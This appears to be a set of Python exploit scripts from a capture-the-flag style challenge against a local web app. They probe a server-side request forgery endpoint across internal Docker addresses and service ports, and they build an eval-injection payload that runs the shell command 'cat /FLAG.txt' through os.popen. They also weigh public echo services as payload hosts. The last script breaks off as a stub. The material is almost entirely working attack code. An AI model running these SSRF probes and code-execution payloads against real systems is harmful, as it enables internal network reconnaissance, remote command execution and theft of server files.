import requests

target_base = "http://127.0.0.1:32985"

# Try common Docker host IPs that the container could use to reach back to us
# If the target is trying to reach us, we need an IP the container can use

# Common Docker-to-host IPs
docker_host_ips = [
    "host.docker.internal",
    "172.17.0.1",        # Docker default bridge
    "172.18.0.1",        # Docker user-defined bridge
    "172.19.0.1",
    "192.168.1.1",       # Common LAN gateway
    "10.0.0.1",          # Common LAN gateway
]

# First, let's try using a public callback service
# Let me try using https://httpbin.org which can be accessed by anyone

print("[+] Trying to use httpbin.org as payload host...")

# httpbin has an /anything endpoint that reflects back
# We could try to use query parameters but the app expects JSON with a "script" field

# Actually let me look at this differently
# The stored URL should return JSON like: {"script": "code"}
# The app does: eval(json.loads(script)["script"])

# What if we use a URL shortener or a redirect?
# Or what if we can exploit another service?

# Let me check if there's a way to inject JSON directly
# Wait - some SSRF vulnerabilities can be exploited using DNS rebinding
# or by finding an internal service that echoes input

# Let me look at what other internal services might be available
internal_ports = [
    "http://flask_api:8080/",  # Maybe flask_api listens on multiple ports?
    "http://flask_api:5000/",
    "http://flask_api:3000/",
    "http://flask_api:9000/",
    "http://nginx:8080/",
]

for url in internal_ports:
    print(f"\n[+] Testing: {url}")
    try:
        set_resp = requests.get(f"{target_base}/api/set?url={url}", timeout=5)
        print(f"    /api/set: {set_resp.status_code}")
        
        app_resp = requests.get(f"{target_base}/app", timeout=5)
        print(f"    /app: {app_resp.status_code}")
        
        if app_resp.status_code == 200:
            print(f"    Response: {app_resp.text[:500]}")
    except Exception as e:
        print(f"    Error: {e}")

print("\n[+] Now trying IP-based access from container perspective...")

# Let me also try the docker network IPs
for ip in docker_host_ips:
    # Use a non-existent port/path to see if we can at least get a connection error
    # confirming the IP is reachable
    url = f"http://{ip}:9999/test"
    print(f"\n[+] Testing IP reachability: {url}")
    try:
        set_resp = requests.get(f"{target_base}/api/set?url={url}", timeout=8)
        print(f"    /api/set: {set_resp.status_code}")
        
        app_resp = requests.get(f"{target_base}/app", timeout=8)
        print(f"    /app: {app_resp.status_code}")
        
        # If we see a connection error, it means the IP is reachable
        if "ConnectionError" in app_resp.text:
            print(f"    [+] IP {ip} is REACHABLE! Read error for details")
        elif "Max retries" in app_resp.text:
            print(f"    [+] IP {ip} might be reachable (connection attempt made)")
    except Exception as e:
        print(f"    Error: {e}")

import requests
import json

target_base = "http://127.0.0.1:32985"

# Let me try dnsbin or other callback service
# Actually, let me try to find any endpoint that will echo JSON back

# Exploring if there's any echo/reflect functionality
print("[+] Looking for JSON echo endpoints...")

# Check if target has any useful endpoints
endpoints = [
    "/",
    "/app", 
    "/api",
    "/api/set",
    "/api/get",
]

for ep in endpoints:
    url = f"{target_base}{ep}"
    print(f"\n[+] GET {url}")
    try:
        resp = requests.get(url, timeout=5)
        print(f"    Status: {resp.status_code}")
        print(f"    Content-Type: {resp.headers.get('Content-Type', 'unknown')}")
        print(f"    Preview: {resp.text[:300]}")
    except Exception as e:
        print(f"    Error: {e}")

# Let me also try POST with JSON to see if it echoes
print(f"\n[+] Trying POST with JSON to various endpoints...")

payload_json = json.dumps({"script": "__import__('os').popen('cat /FLAG.txt').read()"})

post_endpoints = [
    "/api/set",
    "/app",
    "/api",
]

for ep in post_endpoints:
    url = f"{target_base}{ep}"
    print(f"\n[+] POST {url}")
    try:
        resp = requests.post(url, data=payload_json, headers={'Content-Type': 'application/json'}, timeout=5)
        print(f"    Status: {resp.status_code}")
        print(f"    Response: {resp.text[:500]}")
    except Exception as e:
        print(f"    Error: {e}")

import requests
import json
import time

target_base = "http://127.0.0.1:32985"

# Payload to execute
payload = {"script": "__import__('os').popen('cat /FLAG.txt').read()"}
print(f"[+] Payload: {json.dumps(payload)}")

# Method 1: Use httpbin.org's POST endpoint with JSON
# httpbin.org/anything will echo back the request body when POSTed
# But we need a GET endpoint...

